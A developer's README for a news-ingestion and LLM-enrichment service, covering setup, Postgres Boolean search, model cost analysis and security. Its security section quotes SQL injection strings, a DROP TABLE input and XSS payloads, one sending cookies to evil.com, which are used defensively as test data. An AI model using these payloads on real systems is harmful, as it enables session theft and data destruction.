# CARMA Media Signal Service

A service that ingests news articles, enriches them with an LLM, and lets users
search and explore the data. Built for the Senior Fullstack Engineer home assignment.

```
├── database/     # Dockerized PostgreSQL configuration and init scripts
├── backend/      # Node.js + Express API (TypeScript)
├── frontend/     # Vite + React UI (TypeScript)
├── shared/       # Shared TypeScript types used by frontend and backend
└── documents/    # Assignment brief and sample data
```

---

## Quick start

### Prerequisites

- Docker and Docker Compose
- An [OpenRouter](https://openrouter.ai/) API key (for LLM enrichment)

### 1. Configure environment

Copy the example env files and add your API key to `backend/.env`:

```bash
cp backend/.env.example backend/.env
cp frontend/.env.example frontend/.env
cp database/.env.example database/.env
```

Set `OPENROUTER_API_KEY` in `backend/.env`. Browse and search work without it; enrichment does not.

### 2. Start the full stack

```bash
docker compose --profile full up --build
```

This starts PostgreSQL, the backend (`http://localhost:4474`), and the frontend (`http://localhost:5173`).

Seed and enrich from the UI

### Resetting the database

Init scripts only run on a fresh volume:

```bash
docker compose --profile full down -v
docker compose --profile full up --build
```

Then seed again from the UI.

### Local development

Run Postgres in Docker and the app locally:

```bash
npm install
npm run docker:up          # PostgreSQL only
npm run dev:backend        # http://localhost:4474
npm run dev:frontend       # http://localhost:5173
```

Requires Node.js 20.19+ (22+ recommended). You can seed from the UI or with `npm run seed:articles`.

### Environment variables

Each package has its own `.env` (see `.env.example` in each folder).

**`database/`:** `POSTGRES_USER`, `POSTGRES_PASSWORD`, `POSTGRES_DB`

**`backend/`:** `DATABASE_URL`, `PORT`, `OPENROUTER_API_KEY`, LLM guardrail limits

**`frontend/`:** `VITE_API_BASE_URL`, `VITE_APP_TITLE`

### Scripts

- `npm run dev:backend` / `dev:frontend`: start dev servers
- `npm run build`: typecheck and build all workspaces
- `npm run lint`: lint all workspaces
- `npm run docker:up` / `docker:down`: start / stop Postgres only
- `npm run seed:articles`: load sample articles from the CLI
- `npm run enrich:article -- --id N [--force]`: enrich one article via CLI
- `npm run test --workspace=backend`: unit + integration tests
- `npm run test:unit --workspace=backend`: parser/compiler unit tests only
- `npm run test:integration --workspace=backend`: database-backed tests

---

## Plan

I started by reading the assignment and thinking about. There were a few areas I was not fully comfortable with, so I looked those up first: how `tsvector` stores data in Postgres, and whether there were any open-source Boolean search parsers I could lean on rather than writing one from scratch.

From there I picked the stack. Node for the server, Postgres for the database, React with Vite for the frontend. OpenRouter for the LLM provider because it is easy to swap models. Zod for validation on both HTTP inputs and model outputs.

### Project layout

I set up three main folders (`frontend`, `backend`, `database`), added a Docker Compose file, and filled in the usual root-level config.

### Data layer

I started with SQL and the seed script. The schema changed later when I got to the LLM work, but at this stage I defined the core columns and types.

Initially I planned two tables: one for raw article data and one for model enrichment output. That would have let me test different models on the same article and compare results. Once I started thinking about Boolean search, though, I wanted search to cover the LLM summary and topic tags. Splitting enrichment into a separate table would have made that awkward, so I collapsed everything into a single `articles` table.

Indexes I added at this stage:

- **`articles_pkey` on `(id)`**: article fetch during enrichment.
- **`articles_published_at_id_idx` on `(published_at DESC, id DESC)`**: list and search both sort
  and paginate on this pair.
- **`articles_source_idx` on `(source)`** and **`articles_language_idx` on `(language)`**: equality
  filters on facet columns.
- **`articles_search_vector_idx` GIN on `(search_vector)`**: `search_vector @@ tsquery`. GIN over
  GiST because of faster lookups.
- **`articles_enriched_at_idx` on `(enriched_at DESC)`**: daily spend rollup for the budget
  guardrail.

I left `sentiment` and `topic_tags` unindexed. Over 20 rows a sequential scan is fine. At real volume I would add a GIN index on `topic_tags` and composite indexes like
`(source, published_at DESC, id DESC)` for filter-plus-paginate queries.

The `search_vector` column is maintained by a trigger, not a generated column, because `to_tsvector` and `setweight` are not `IMMUTABLE` and Postgres rejects them in generated columns. Headline and summary get weight A, body gets B, topic tags get C.

### Boolean search

When I looked into `tsvector`, I saw that the `simple` config isn't best for Chinese: no word boundaries, so a bare token like `科技` will not match unless you use a wildcard (`中国*` works). I also saw that Postgres even has plugins for Chinese full-text search. I decided not to go there. I also skipped using the `language` column to pick per-language configs for the sake of simplicity.

### LLM enrichment

This part was relatively straightforward. I have worked with small and self-hosted models before, and my first thought was the recent Qwen and Gemma families. I ended up on `qwen/qwen3.6-35b-a3b` through OpenRouter: a 35B mixture-of-experts model, cheaper and faster per token than the dense 27B variant.

I did work with 9B and 4B models before. A 9B model might be enough here and would cost less, but at that size structured output and sentiment classification get less stable in my experience. I did not want to spend time tuning prompts and checking prompts to get a smaller model reliable. The 35B MoE was a safe choice: still cheaper than frontier mini models like GPT-4o. 

I also kept the fixed system prompt at the start and put variable article text at the end, which helps cache hits on repeated requests.

For safety I focused on two things. First, tell the model not to treat article content as instructions. Second, output goes through a strict JSON schema; if the model goes off-script, the response fails validation and nothing gets written.

I capped article input size. I did not add server-side caching. Instead the frontend blocks immediate re-enrichment: if an article is already enriched, the user has to confirm before spending tokens again.

Partway through enrichment work I added `prompt_tokens`, `completion_tokens`, and `cost_usd` columns so spend is tracked per article in the database.

### Frontend

I did not spend long on the UI. The goal was to expose the required controls and add a few quality-of-life features: seed articles, enrich remaining unenriched articles, confirm before re-enriching. Beyond that it was wiring up local state and calling the backend APIs.

### Wrap-up

After the frontend was working I did two things. I went through the brief with the coding agent to check I had not missed a requirement. Then I cleaned up duplicated helpers, misplaced types, and other small mess before submission.

If time had run short, I would have cut in roughly this order: batch "enrich remaining", the Cost tab, the aggregate chart, and prefix/wildcard search. I would not have cut parameterised SQL, output escaping, or enrichment guardrails.

---

## Architecture & decisions

### Tech stack

- **Node.js + TypeScript**: the brief's preferred stack.
- **Express**: simple and strightforward.
- **PostgreSQL 16**: one database for relational filtering, time bucketing, and full-text search.
- **Zod**: one validation library for HTTP query parameters and LLM response bodies.
- **Vite + React**: Good choice for SPAs
- **npm workspaces + `shared/`**: API response types declared once and imported by both sides.

### Schema design

One `articles` table. Enrichment is 1:1 with an article and not versioned here. A separate
enrichments table would only pay off if I needed to compare model versions side by side.

Notes:

- **`headline and body` are (nullable) while `source` is not NULL**: The main reasons is that if I were collecting articles and something happend in the pipeline I would want to preserve the articles that were found given that I can trace it back to the source and gather the headline / body again. If no source is present and it cant be traced it would be a dead row. 
- **`sentiment sentiment_type`**: a Postgres ENUM. The LLM cannot write an out-of-domain sentiment even if it ignores the response schema.
- **`search_vector TSVECTOR`**: precomputed by trigger; see Plan above.

### Boolean search approach

Hand-rolled tokenizer and recursive-descent parser, compiled to parameterised `tsquery`.

The pipeline: tokenize, parse to AST, validate complexity, compile to SQL.

- **Term** → `plainto_tsquery('simple', $n)`
- **Phrase** → `phraseto_tsquery('simple', $n)` (proximity via `<->`, not an AND of words)
- **Prefix** → `to_tsquery('simple', quote_literal(lower($n)) || ':*')`
- **AND / OR / NOT** → `&&` / `||` / `!!` between compiled children

**Known limitations.** Chinese tokenises as long clauses under `simple`; partial tokens need a wildcard. Root-level negation (`NOT nuclear` alone) is rejected because it cannot use the GIN index efficiently. Results order by `published_at DESC`, not relevance rank, because keyset pagination needs a stable total order.

Proper CJK support would need a segmenter like `pg_jieba` or `zhparser`, with `search_vector` built
per-language from the `language` column.

---

## LLM cost analysis

### Model selection

**`qwen/qwen3.6-35b-a3b` via OpenRouter, for all three enrichment tasks.**

- **Cost:** $0.10 / 1M input, $0.95 / 1M output at the pinned provider. Roughly two orders of
  magnitude below frontier models for summarise-and-classify work.
- **Quality:** A 35B sparse MoE (3B active) is enough for 1-2 sentence summarisation and 4-way
  sentiment. It handles the Arabic and Chinese articles correctly, returning English summaries as
  instructed. Verified against the real API.
- **Latency:** ~2-5s per article with a 400-token output cap. OpenRouter supports parallel requests
- **Structured output:** supports `response_format` with a strict JSON schema. That constraint ruled out several cheaper providers.

**Why one model rather than two.** All three outputs come from one JSON response in one call. Splitting sentiment onto a cheaper model would mean paying the ~500-token article prompt twice.

**Provider pinning.** OpenRouter serves this model through nine providers from $0.10-$0.285 / 1M input. Requests set `provider: { require_parameters: true, sort: "price" }`. Without the sort, observed cost was ~$0.000131/article; with it, ~$0.000105. Same model, ~20% cheaper.

### Per-article cost

Measured over all 20 sample articles:

- Average input tokens: 525
- Average output tokens: 55
- Input cost: 525 × $0.10/1M = **$0.0000525**
- Output cost: 55 × $0.95/1M = **$0.0000523**
- **Cost per article: ~$0.000105**

Input and output cost are near-identical: output is ~10× shorter but ~10× more expensive per token. That is why `LLM_MAX_OUTPUT_TOKENS` is the tightest guardrail.

### Projected at 50,000 articles/day

- Daily: **$5.24**
- Monthly (30d): **$157.13**

Costs are recorded from OpenRouter's reported `usage.cost` per request, not estimated from the pricing table. The `/api/enrichment/cost-estimate` endpoint computes this projection live from observed averages.

### Guardrails implemented

- **Output token cap**: `max_tokens` on every request (default 400). `openrouter-client.ts`
- **Input size cap**: headline truncated to 512 chars, body to 8000. `guards.ts`
- **Daily budget**: spend summed from `cost_usd` for the current UTC day; HTTP 429 above
  `LLM_DAILY_BUDGET_USD`. `enrichment-service.ts`
- **Result caching**: already-enriched articles short-circuit unless `?force=true`.
  `enrichment-service.ts`
- **Bounded retries**: exponential backoff on 429/5xx, capped at `OPENROUTER_MAX_RETRIES`
  (default 2); 4xx is not retried. `openrouter-client.ts`
- **Request timeout**: `AbortController` at `OPENROUTER_TIMEOUT_MS` (default 30s).
  `openrouter-client.ts`
- **Cheapest-provider routing**: `provider.sort = "price"`. `openrouter-client.ts`

**Known gap.** The budget check is read-then-act. Concurrent enrichments can all pass the check before any of them writes, so the budget can be overshot under parallel load. A correct fix would be `SELECT ... FOR UPDATE` on a budget row, or reserve-then-reconcile. Documented rather than fixed because the batch path is currently the only concurrent caller.

---

## Security & responsibility

### SQL injection

Every query is parameterised. There is no string interpolation of user input into SQL anywhere, including the boolean search path.

The search compiler builds only operator structure from a validated AST; every leaf value becomes a bind parameter:

There is a second surface: **tsquery injection**. Passing raw text to `to_tsquery` lets input like `a') | 'b` inject operators even through a bind parameter. Prefix terms use `quote_literal(lower($n)) || ':*'`. Plain terms and phrases use `plainto_tsquery`/`phraseto_tsquery`.

Identifiers that cannot be parameterised are whitelisted: sort direction is fixed, and `granularity` is validated against `month | week` by Zod before reaching `date_trunc`.

Integration tests fire `oil') OR 1=1 --` and `'; DROP TABLE articles; --` at the search endpoint and assert the table still exists afterwards.

### XSS

Articles 6 and 18 carry deliberate payloads:

- Article 6, headline: `<img src=x onerror=alert('XSS')>Breaking: Major Data Breach Reported`
- Article 6, body: `<script>document.location='http://evil.com/steal?c='+document.cookie</script>`
- Article 18, body: `<b onmouseover=alert(1)>vigorously</b>`

These are stored raw and escaped at render. Sanitising on ingest would destroy the original document.

Every article field reaches the DOM as a JSX text child. There is no `dangerouslySetInnerHTML`, `innerHTML`, `eval`, or `document.write` anywhere in the frontend.

### Prompt injection

Three layers:

2. **Delimiting**: article content wrapped in `<ARTICLE_INPUT>` / `</ARTICLE_INPUT>` markers; those    strings are stripped from the content so the article cannot close its own delimiter.
3. **Instruction hierarchy**: the system prompt states that delimited content is untrusted data.
4. **Output constraint**: strict JSON schema, then Zod validation, then a language guard rejecting non-English output. A successful injection still cannot produce anything but a valid summary/sentiment/tags object, and cannot write an out-of-domain sentiment because the column is an ENUM.

## Reflection

### Where AI helped most
AI has helped me the most with code generation, routine tasks like setting up folders and boilerplate files, and research. It is also very helpfull with drafting plans and cross checking functionality, although it's important to keep the scope size in check as the quality drops with large functionality cover and it starts missing items. 

It's also helpful at finding and fixing bug.

### Where it misled me

For me the most annoying part about current LLMs is that they get out of control if you let them. I've setup my person coding guidelines in the Cursor global rule, added ESLint rules, and kept amending the plans to exlude extra functionality it tried to squeeze in. 

It also quite often ignores DRY and SoC principles. It adds repeated code instead of extracting single utility; creates huge functions and files instead splitting them into manageble, seperated chunks. Duplicate types, assign unknow type when there is a clear existing type to be used. 

It also loves creating unit tests for the sake of coverage, while the actual unit tests only verifies the code it just writeen and does not actually represent a functinal verification. 

Another problem is it loves defensive programming where it would, for example, mock the UI with good enough approximataion where in reality it should have displayed that no data is available. This happened at the pricing tab when I deleted all articles from the database and it still showed a price per article approximation. 

### What I would do differently with more time

1. Fix the budget race properly.
2. Language-specific full-text search.
3. Test larger number of LLM models and differfent prompts to drive the cost / latency down
